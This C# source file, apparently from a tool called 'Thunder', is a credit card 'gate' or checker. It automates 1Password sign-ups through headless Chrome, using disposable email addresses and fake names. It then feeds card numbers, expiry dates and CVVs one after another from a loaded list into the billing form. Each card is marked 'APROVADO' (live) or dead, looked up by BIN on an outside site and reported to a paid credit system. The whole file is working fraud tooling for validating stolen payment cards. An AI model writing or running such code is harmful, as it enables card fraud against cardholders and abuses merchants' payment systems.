using System;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Threading;
using System.Windows.Forms;
using System.Windows.Forms.VisualStyles;
using gateBeta;
using Newtonsoft.Json;
using OpenQA.Selenium;
using OpenQA.Selenium.Chrome;
using OpenQA.Selenium.Interactions;
using OpenQA.Selenium.Support.Extensions;
using OpenQA.Selenium.Support.UI;
using Keys = OpenQA.Selenium.Keys;

namespace gateDanny.gates
{
    class _1Password
    {
        ChromeDriver driver;
        check check = new check();
        string correo;
        string clave;
        int pagos = 0;
        int numeroTargeta = 1;
        private readonly Random _random = new Random();

        public string checkbin(string bin)
        {
            try
            {
                string jsonString = "";
                HttpWebRequest request = (HttpWebRequest)WebRequest.Create("https://softoo.info/thunder/bin.php/?bin=" + bin);
                request.Method = "GET";
                request.Credentials = CredentialCache.DefaultCredentials;
                ((HttpWebRequest)request).UserAgent = "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 7.1; Trident/5.0)";
                request.Accept = "/";
                request.UseDefaultCredentials = true;
                request.Proxy.Credentials = System.Net.CredentialCache.DefaultCredentials;
                //request.ContentType = "application/x-www-form-urlencoded";
                request.ContentType = "application/x-www-form-urlencoded";
                WebResponse response = request.GetResponse();
                StreamReader sr = new StreamReader(response.GetResponseStream());
                jsonString = sr.ReadToEnd();
                sr.Close();
                return jsonString.Trim();
            }
            catch (Exception ex)
            {

                return "Desconocido";
            }

        }

        private string getNum()
        {
            Random obj = new Random();
            string posibles = "0123456789";
            int longitud = posibles.Length;
            char letra;
            int longitudnuevacadena = 9;
            string nuevacadena = "";
            for (int i = 0; i < longitudnuevacadena; i++)
            {
                letra = posibles[obj.Next(longitud)];
                nuevacadena += letra.ToString();
            }
            return nuevacadena;
        }

        public int RandomNumber(int min, int max)
        {
            return _random.Next(min, max);
        }


        private bool tiempoElementoeMAIL(By by)
        {
            string elemento = "";
            int tiempo = 0;

            while (elemento == "")
            {
                if (tiempo <= 15)
                {

                    if (IsElementPresent(By.XPath("//*[@id='refresh']")))
                    {
                        driver.FindElement(By.XPath("//*[@id='refresh']")).Click();
                        Thread.Sleep(1000);
                    }


                    if (IsElementPresent(by))
                    {
                        if (driver.FindElement(by).Displayed == true)
                        {
                            elemento = "ok";
                        }
                    }

                }
                else
                {
                    elemento = "Error";
                }
                tiempo++;
            }

            if (elemento != "Error")
            {
                return true;
                //DetailProduct();
            }
            else
            {
                return false;
            }
        }


        private bool tiempoElementoeMAILTR(By by)
        {
            string elemento = "";
            int tiempo = 0;

            while (elemento == "")
            {
                if (tiempo <= 15)
                {

                    if (IsElementPresent(By.XPath("//*[@id='refresh']")))
                    {
                        driver.FindElement(By.XPath("//*[@id='refresh']")).Click();
                        Thread.Sleep(1000);
                    }


                    if (IsElementPresent(by))
                    {
                        if (driver.FindElement(by).Displayed == true)
                        {
                            elemento = "ok";
                        }
                    }

                }
                else
                {
                    elemento = "Error";
                }
                tiempo++;
            }

            if (elemento != "Error")
            {
                return true;
                //DetailProduct();
            }
            else
            {
                return false;
            }
        }
        private bool tiempoElemento(By by)
        {
            string elemento = "";
            int tiempo = 0;

            while (elemento == "")
            {
                if (tiempo <= 30)
                {
                    if (IsElementPresent(by))
                    {
                        if (driver.FindElement(by).Displayed == true)
                        {
                            elemento = "ok";
                        }
                    }

                }
                else
                {
                    elemento = "Error";
                }
                tiempo++;
            }

            if (elemento != "Error")
            {
                return true;
                //DetailProduct();
            }
            else
            {
                return false;
            }
        }


        public void load()
        {

            check.login(Variables.key);
            if (int.Parse(Variables.creditos) <= 0)
            {
                MessageBox.Show("Recargue sus creditos");
                return;
            }


            if (Thunder._Form1.numcc() > 0 && Variables.run == true && Variables.gate == "2")
            {

                Thunder._Form1.update_progresbar(5);
                var chromeOptions = new ChromeOptions();
                correo = "joseffernana" + getNum() + "@gmail.com";
                clave = "Jo." + getNum();

                //chromeOptions.AddArguments(new List<string>() { "headless" });
                //chromeOptions.AddArguments("--blink-settings=imagesEnabled=false", "--window-size=1920,1080");, "--headless"
                chromeOptions.AddArguments("--window-size=1920,1080", "--blink-settings=imagesEnabled=false", "--incognito", "--headless");//"--headless"

                var chromeDriverService = ChromeDriverService.CreateDefaultService();
                chromeDriverService.HideCommandPromptWindow = true;

                driver = new ChromeDriver(chromeDriverService, chromeOptions);
                driver.Url = "https://start.1password.com/sign-up";
                Thread.Sleep(1000);
                Thunder._Form1.update_progresbar(7);
                GetEmail();
                Thunder._Form1.update_progresbar(15);
                Thread.Sleep(1000);

                try
                {
                    if (tiempoElemento(By.Id("user-name")))
                    {
                        Thunder._Form1.update_progresbar(20);
                        driver.FindElementById("user-name").SendKeys("JORGE REYES");
                        Thread.Sleep(1000);
                        driver.FindElementById("email").SendKeys(correo);
                        Thread.Sleep(1000);
                        driver.FindElementByXPath("//*[@id='submit']").Click();
                        Thread.Sleep(3000);

                        if (IsElementPresent(By.XPath("//*[@id='submit']")))
                        {
                            driver.FindElementByXPath("//*[@id='submit']").Click();
                        }

                        if (tiempoElemento(By.Id("code")))
                        {
                            Thunder._Form1.update_progresbar(25);
                            driver.SwitchTo().Window(driver.WindowHandles[1]);
                            Thread.Sleep(500);

                            if (tiempoElemento(By.XPath("//*[@id='refresh']")))
                            {
                                Thunder._Form1.update_progresbar(30);
                                driver.FindElement(By.XPath("//*[@id='refresh']")).Click();
                                Thread.Sleep(1000);

                                if (tiempoElementoeMAIL(By.XPath("//*[@id='inbox']/table/tbody/tr")))
                                {
                                    Thunder._Form1.update_progresbar(35);
                                    Thread.Sleep(2000);
                                    driver.FindElement(By.XPath("//*[@id='inbox']/table/tbody/tr")).Click();
                                    Thread.Sleep(1000);
                                    //opt
                                    if (tiempoElementoeMAILTR(By.XPath("//*[@id='message-frame']")))
                                    {
                                        Thunder._Form1.update_progresbar(40);
                                        driver.SwitchTo().Frame(driver.FindElement(By.XPath("//*[@id='message-frame']")));
                                        Thread.Sleep(1000);
                                        if (tiempoElemento(By.XPath("//*[@id='templateContainer']/tbody/tr/td/table/tbody/tr[2]/td/table/tbody/tr[2]/td[2]/p")))
                                        {
                                            Thunder._Form1.update_progresbar(45);
                                            var opt = driver.FindElement(By.XPath("//*[@id='templateContainer']/tbody/tr/td/table/tbody/tr[2]/td/table/tbody/tr[2]/td[2]/p")).Text;
                                            Thunder._Form1.update_progresbar(40);
                                            Thread.Sleep(1000);

                                            Thread.Sleep(500);
                                            driver.SwitchTo().Window(driver.WindowHandles[0]);
                                            Thread.Sleep(500);
                                            driver.SwitchTo().ParentFrame();
                                            Thread.Sleep(100);

                                            if (tiempoElemento(By.Id("code")))
                                            {
                                                Thunder._Form1.update_progresbar(50);
                                                driver.FindElementById("code").SendKeys(opt);
                                                Thread.Sleep(1000);
                                                driver.FindElementByXPath("//*[@id='submit']").Click();
                                                Thread.Sleep(1000);

                                                if (tiempoElemento(By.Id("master-password")))
                                                {
                                                    Thunder._Form1.update_progresbar(55);
                                                    driver.FindElementById("master-password").SendKeys(clave);
                                                    Thread.Sleep(1000);
                                                    driver.FindElementById("confirm-master-password").SendKeys(clave);
                                                    Thread.Sleep(1000);
                                                    driver.FindElementByXPath("//*[@id='submit']").Click();
                                                    Thread.Sleep(1000);

                                                    if (IsElementPresent(By.Id("card-number")))
                                                    {
                                                        Thunder._Form1.update_progresbar(60);
                                                        driver.FindElementById("card-number").SendKeys("5471678315077075");
                                                        Thread.Sleep(1000);
                                                        driver.FindElementById("exp-month").SendKeys("10");
                                                        Thread.Sleep(1000);
                                                        driver.FindElementById("exp-year").SendKeys("23");
                                                        Thread.Sleep(1000);
                                                        driver.FindElementById("security-code").SendKeys("000");
                                                        Thread.Sleep(1000);
                                                        driver.FindElementByXPath("//*[@id='submit']").Click();
                                                        Thread.Sleep(10000);

                                                        if (tiempoElemento(By.XPath("//*[@id='modal']")))
                                                        {
                                                            Thunder._Form1.update_progresbar(65);
                                                            driver.Url = "https://my.1password.com/";
                                                            Thread.Sleep(1000);

                                                            if (tiempoElemento(By.Id("master-password")))
                                                            {
                                                                Thunder._Form1.update_progresbar(70);
                                                                driver.FindElementById("master-password").SendKeys(clave);
                                                                Thread.Sleep(1000);
                                                                driver.FindElementByXPath("//*[@id='signin-form']/div/div[3]/button").Click();
                                                                Thread.Sleep(1000);

                                                                if (tiempoElemento(By.Id("ekit-already-downloaded")))
                                                                {

                                                                    if (IsElementPresent(By.Id("ekit-already-downloaded")))
                                                                    {
                                                                        Thunder._Form1.update_progresbar(75);
                                                                        if (driver.FindElementById("ekit-already-downloaded").Displayed == true)
                                                                        {
                                                                            driver.FindElementById("ekit-already-downloaded").Click();
                                                                            Thread.Sleep(2000);
                                                                            Thunder._Form1.update_progresbar(80);
                                                                            if (tiempoElemento(By.XPath("//*[@id='main-content']/div[1]/a")))
                                                                            {
                                                                                driver.FindElementByXPath("//*[@id='main-content']/div[1]/a").Click();
                                                                                Thread.Sleep(2000);

                                                                                if (IsElementPresent(By.XPath("//*[@id='main-content']/div/section[2]/div/button")))
                                                                                {

                                                                                    driver.FindElementByXPath("//*[@id='main-content']/div/section[2]/div/button").Click();
                                                                                    Thread.Sleep(1000);
                                                                                    Thunder._Form1.update_progresbar(85);
                                                                                    if (tiempoElemento(By.Id("card-number")))
                                                                                    {
                                                                                        pago();
                                                                                    }
                                                                                    else
                                                                                    {
                                                                                        restart();
                                                                                    }
                                                                                }
                                                                                else
                                                                                {
                                                                                    restart();
                                                                                }
                                                                            }
                                                                            else
                                                                            {
                                                                                restart();
                                                                            }
                                                                        }
                                                                        else
                                                                        {
                                                                            restart();
                                                                        }
                                                                    }
                                                                    else
                                                                    {
                                                                        restart();
                                                                    }
                                                                }
                                                                else
                                                                {
                                                                    restart();
                                                                }
                                                            }
                                                            else
                                                            {
                                                                restart();
                                                            }
                                                        }
                                                        else
                                                        {
                                                            restart();
                                                        }

                                                       
                                                    }
                                                    else
                                                    {
                                                        restart();
                                                    }
                                                }
                                                else
                                                {
                                                    restart();
                                                }
                                            }
                                            else
                                            {
                                                restart();
                                            }
                                        }
                                        else
                                        {

                                            restart();
                                        }
                                    }
                                    else
                                    {

                                        restart();
                                    }
                                }
                                else
                                {

                                    restart();
                                }

                            }
                            else
                            {

                                restart();
                            }
                        }
                        else
                        {
                            restart();
                        }


                    }
                    else
                    {
                        restart();
                    }
                }
              catch (Exception ex)
                {
                    if (Thunder._Form1.numcc() > 0 && Variables.run == true && Variables.gate == "2")
                    {
                        restart();
                    }

                }

            }
        }


        private bool IsElementPresent(By by)
        {
            try
            {
                Thread.Sleep(2000);
                driver.FindElement(by);
                return true;
            }
            catch (NoSuchElementException)
            {
                return false;
            }
        }

        private void restart()
        {

            if (Thunder._Form1.numcc() > 0 && Variables.run == true && Variables.gate == "2")
            {
                try
                {
                    pagos = 0;

                    driver.Close();
                    driver.Quit();
                    load();
                }
                catch (Exception)
                {


                    pagos = 0;
                    driver.Quit();
                    load();
                }
            }


        }

        private void GetEmail()
        {
            try
            {
                //###--obtener email--#####
                ((IJavaScriptExecutor)driver).ExecuteScript("window.open();");
                driver.SwitchTo().Window(driver.WindowHandles.Last());
                Thread.Sleep(300);
                driver.Url = "https://www.abandonmail.com/es";
                Thread.Sleep(5000);

                if (tiempoElemento(By.XPath("//*[@id='randombtn']")))
                {
                    driver.FindElement(By.XPath("//*[@id='randombtn']")).Click();
                    Thread.Sleep(1000);
                }
                else
                {

                    restart();
                }

                if (tiempoElemento(By.XPath("//*[@id='emailtouse']")))
                {
                    correo = driver.FindElement(By.XPath("//*[@id='emailtouse']")).GetAttribute("value");
                    Thread.Sleep(1000);
                }
                else
                {

                    restart();
                }

                Thread.Sleep(1000);

                driver.SwitchTo().Window(driver.WindowHandles.First());
            }
            catch (Exception ex)
            {


                if (Variables.run == true)
                {
                    restart();
                }
            }






        }
        private void pago()
        {
            try
            {



                if (Thunder._Form1.numcc() > 0 && Variables.run == true && Variables.gate == "2")
                {
                    if (pagos < 10)
                    {
                        Thunder._Form1.update_progresbar(90);

                        string cc = Thunder._Form1.nextCc();
                        string[] ccLine = cc.Split('|');
                        var ccnum = ccLine[0];

                        if (tiempoElemento(By.Id("card-number")))
                        {


                            driver.FindElementById("card-number").SendKeys(ccnum);

                            Thread.Sleep(1000);
                            driver.FindElementById("exp-month").Clear();
                            Thread.Sleep(1000);
                            driver.FindElementById("exp-month").SendKeys(ccLine[1]);
                            Thread.Sleep(1000);
                            driver.FindElementById("exp-year").Clear();
                            Thread.Sleep(1000);
                            driver.FindElementById("exp-year").SendKeys(ccLine[2].Remove(0,2));
                            Thread.Sleep(1000);
                            driver.FindElementById("security-code").SendKeys(ccLine[3]);
                            Thread.Sleep(1000);
                            driver.FindElementByXPath("//*[@id='modal']/div/main/div/div[1]/div/button").Click();
                            Thread.Sleep(5000);

                        }
                        else
                        {
                            restart();
                        }


                        Thunder._Form1.update_progresbar(95);

                        if (confirmar())
                        {
                            Thunder._Form1.update_progresbar(100);
                            var pais = checkbin(cc.Substring(0, 6));
                            var guardar = numeroTargeta + " - " + cc + " - " + pais + " " + Variables.gate;
                            check.ccss(Variables.key, guardar, "lives");
                            Thunder._Form1.agrgar_live(" ** APROVADO ** - " + cc + " - " + pais);
                            check.playlive();
                            Console.WriteLine("live " + numeroTargeta + " - " + cc + " - " + correo + " - " + clave);
                            Thunder._Form1.remove_cc(0, cc.Length);
                            numeroTargeta++;
                            pagos++;
                            restart();
                        }
                        else
                        {
                            var pais = "";
                            Thunder._Form1.update_progresbar(100);
                            var guardar = numeroTargeta + " - " + cc + " - " + pais + " " + Variables.gate;
                            check.ccss(Variables.key, guardar, "deads");
                            Thread.Sleep(300);
                            Thunder._Form1.agragar_dead(cc);
                            Console.WriteLine("dead " + numeroTargeta + " - " + cc + " - " + correo + " - " + clave);
                            Thunder._Form1.remove_cc(0, cc.Length);
                            numeroTargeta++;
                            pagos++;
                            pago();
                        }
                    }
                    else
                    {
                        restart();
                    }
                }
            }
            catch (Exception ex)
            {
                //MessageBox.Show(ex.ToString());
                if (Thunder._Form1.numcc() > 0 && Variables.run == true && Variables.gate == "2")
                {
                    restart();
                }

            }

        }

        public void stop()
        {
            try
            {
                pagos = 0;
                numeroTargeta = 0;
                driver.Close();
                driver.Quit();
                Thunder._Form1.abort();
                return;
            }
            catch (Exception ex)
            {

                Console.WriteLine(ex.ToString());
                Thunder._Form1.abort();
                return;
            }

        }

        public bool confirmar()
        {
            string estado = "";
            bool resp = false;

            int tiempo = 0;

            while (estado == "")
            {

                if (tiempo < 30)
                {



                    if (IsElementPresent(By.XPath("//*[@id='modal']/div/main/div/div[1]/div/div[4]/p")))
                    {
                        if (driver.FindElement(By.XPath("//*[@id='modal']/div/main/div/div[1]/div/div[4]/p")).Displayed == true)
                        {
                            if (driver.FindElement(By.XPath("//*[@id='modal']/div/main/div/div[1]/div/div[4]/p")).Text.Contains("seguridad"))
                            {
                                Thunder._Form1.agrgar_live_cvv("(no cvc) - ");
                                estado = "live";
                            }
                            else
                            {
                                estado = "dead";
                            }
                        }
                    }

                    if (IsElementPresent(By.XPath("//*[@id='main-content']/div/section[2]/div/div/div[2]/div[2]/p[1]")))
                    {
                        if (driver.FindElement(By.XPath("//*[@id='main-content']/div/section[2]/div/div/div[2]/div[2]/p[1]")).Displayed == true)
                        {
                            if (driver.FindElement(By.XPath("//*[@id='main-content']/div/section[2]/div/div/div[2]/div[2]/p[1]")).Text.Trim() != "")
                            {

                                estado = "live";
                            }
                        }
                    }

                }
                else
                {
                    estado = "error";
                }

                tiempo++;
            }

            if (estado == "dead2")
            {
                pagos = 20;

                return false;

            }

            if (estado == "dead")
            {

                driver.Navigate().Refresh();

                Thread.Sleep(1000);

                if (tiempoElemento(By.Id("master-password")))
                {
                    driver.FindElementById("master-password").SendKeys(clave);
                    Thread.Sleep(3000);
                    driver.FindElementByXPath("//*[@id='signin-form']/div/div[4]/button").Click();
                    Thread.Sleep(1000);

                    if (tiempoElemento(By.XPath("//*[@id='main-content']/div/section[2]/div/button")))
                    {
                        driver.FindElementByXPath("//*[@id='main-content']/div/section[2]/div/button").Click();
                        Thread.Sleep(1000);

                        if (tiempoElemento(By.Id("card-number")))
                        {
                            return false;
                        }
                        else
                        {
                            restart();
                            return false;
                        }
                    }
                    else
                    {
                        restart();
                        return false;
                    }

                }
                else
                {
                    restart();
                    return false;
                }



           
            }

            if (estado == "live")
            {
                return true;
            }

            if (estado == "error")
            {
                restart();
                return false;
            }

            return false;

        }



        public static DialogResult InputBox(string title, string promptText, ref string value)
        {
            Form form = new Form();
            Label label = new Label();
            TextBox textBox = new TextBox();
            Button buttonOk = new Button();
            Button buttonCancel = new Button();

            form.Text = title;
            label.Text = promptText;
            textBox.Text = value;

            buttonOk.Text = "OK";
            buttonCancel.Text = "Cancel";
            buttonOk.DialogResult = DialogResult.OK;
            buttonCancel.DialogResult = DialogResult.Cancel;

            label.SetBounds(9, 20, 372, 13);
            textBox.SetBounds(12, 36, 372, 20);
            buttonOk.SetBounds(228, 72, 75, 23);
            buttonCancel.SetBounds(309, 72, 75, 23);

            label.AutoSize = true;
            textBox.Anchor = textBox.Anchor | AnchorStyles.Right;
            buttonOk.Anchor = AnchorStyles.Bottom | AnchorStyles.Right;
            buttonCancel.Anchor = AnchorStyles.Bottom | AnchorStyles.Right;

            form.ClientSize = new Size(396, 107);
            form.Controls.AddRange(new Control[] { label, textBox, buttonOk, buttonCancel });
            form.ClientSize = new Size(Math.Max(300, label.Right + 10), form.ClientSize.Height);
            form.FormBorderStyle = FormBorderStyle.FixedDialog;
            form.StartPosition = FormStartPosition.CenterScreen;
            form.MinimizeBox = false;
            form.MaximizeBox = false;
            form.AcceptButton = buttonOk;
            form.CancelButton = buttonCancel;

            DialogResult dialogResult = form.ShowDialog();
            value = textBox.Text;
            return dialogResult;
        }


    }
}

